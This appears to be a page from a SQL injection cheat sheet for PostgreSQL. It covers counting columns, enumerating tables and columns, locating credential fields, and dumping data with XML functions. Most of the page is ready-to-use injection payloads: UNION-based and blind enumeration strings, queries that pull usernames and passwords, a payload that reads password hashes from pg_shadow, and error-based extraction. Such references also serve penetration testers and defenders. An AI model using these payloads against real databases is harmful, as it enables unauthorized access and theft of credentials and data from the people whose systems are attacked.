---
title: Tables and Columns
description: How to discover and extract table and column information in PostgreSQL
category: Information Gathering
order: 8
tags: ["schema", "tables", "columns", "enumeration"]
lastUpdated: 2025-12-07
---

## Tables and Columns

Discovering table and column information is a critical step in SQL injection attacks. PostgreSQL provides multiple ways to enumerate schema information.

### Determining Number of Columns

#### Using ORDER BY

```sql
-- Keep incrementing n until you get an error
ORDER BY 1    -- Success
ORDER BY 2    -- Success
ORDER BY 3    -- Success
ORDER BY 4    -- Error: ORDER BY position 4 is not in select list
```

#### Using NULL in UNION

```sql
-- Add NULLs until the query succeeds
' UNION SELECT NULL--             -- Error
' UNION SELECT NULL,NULL--        -- Error
' UNION SELECT NULL,NULL,NULL--   -- Success (3 columns)
```

### Retrieving Tables

#### Using information_schema (Recommended)

```sql
-- List all tables in current database
SELECT table_name FROM information_schema.tables
WHERE table_schema = 'public';

-- List all tables with schema
SELECT table_schema, table_name FROM information_schema.tables
WHERE table_schema NOT IN ('pg_catalog', 'information_schema');

-- Get as comma-separated list
SELECT string_agg(table_name, ',')
FROM information_schema.tables
WHERE table_schema = 'public';
```

#### Using pg_catalog

```sql
-- List tables using pg_tables
SELECT tablename FROM pg_tables
WHERE schemaname = 'public';

-- Using pg_class
SELECT relname FROM pg_class
WHERE relkind = 'r'
AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = 'public');
```

### Retrieving Columns

#### Using information_schema

```sql
-- Get columns for a specific table
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_name = 'users';

-- Get column names as list
SELECT string_agg(column_name, ',')
FROM information_schema.columns
WHERE table_name = 'users';

-- Find columns by name pattern (e.g., password fields)
SELECT table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%secret%';
```

#### Using pg_catalog

```sql
-- Get columns using pg_attribute
SELECT a.attname
FROM pg_attribute a
JOIN pg_class c ON a.attrelid = c.oid
WHERE c.relname = 'users'
AND a.attnum > 0
AND NOT a.attisdropped;
```

### Injection Examples

```sql
-- UNION-based table enumeration
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='public'--

-- UNION-based column enumeration
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Get table and columns together
' UNION SELECT NULL,table_name||':'||string_agg(column_name,','),NULL
FROM information_schema.columns
WHERE table_schema='public'
GROUP BY table_name--

-- Blind injection for table names
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='u'--
```

### Using LIMIT and OFFSET

```sql
-- Get tables one by one
SELECT table_name FROM information_schema.tables
WHERE table_schema = 'public'
LIMIT 1 OFFSET 0;  -- First table

SELECT table_name FROM information_schema.tables
WHERE table_schema = 'public'
LIMIT 1 OFFSET 1;  -- Second table
```

### Finding Interesting Tables

```sql
-- Find tables likely to contain credentials
SELECT table_name FROM information_schema.tables
WHERE table_name LIKE '%user%'
   OR table_name LIKE '%admin%'
   OR table_name LIKE '%account%'
   OR table_name LIKE '%member%'
   OR table_name LIKE '%login%';
```

### XML Helper Functions for Data Extraction

PostgreSQL provides powerful XML functions that can extract entire tables or databases as XML, useful when you need to exfiltrate large amounts of data:

#### query_to_xml()

Converts any query result to XML:

```sql
-- Extract entire table as XML
SELECT query_to_xml('SELECT * FROM users', true, true, '');

-- Extract specific columns
SELECT query_to_xml('SELECT username, password FROM users', true, true, '');

-- With WHERE clause
SELECT query_to_xml('SELECT * FROM users WHERE role=''admin''', true, true, '');
```

#### table_to_xml()

Converts a table directly to XML:

```sql
-- Extract entire table
SELECT table_to_xml('users', true, true, '');

-- With schema qualification
SELECT table_to_xml('public.users', true, true, '');
```

#### database_to_xml()

Extracts the entire database schema and data as XML (use with caution - can be very large):

```sql
-- Full database dump as XML
SELECT database_to_xml(true, true, '');
```

#### database_to_xmlschema()

Gets the database schema structure without data:

```sql
-- Get database structure only
SELECT database_to_xmlschema(true, true, '');
```

#### XML Extraction Injection Examples

```sql
-- UNION-based XML extraction
' UNION SELECT NULL,query_to_xml('SELECT * FROM users',true,true,''),NULL--

-- Extract password hashes via XML
' UNION SELECT NULL,query_to_xml('SELECT usename,passwd FROM pg_shadow',true,true,''),NULL--

-- Error-based XML extraction (if output is limited)
' AND 1=CAST(query_to_xml('SELECT password FROM users LIMIT 1',true,true,'') AS int)--
```

### Notes

- `information_schema` is SQL-standard and portable across databases
- `pg_catalog` provides more PostgreSQL-specific details
- String comparison in PostgreSQL is case-sensitive by default
- Use `ILIKE` for case-insensitive pattern matching
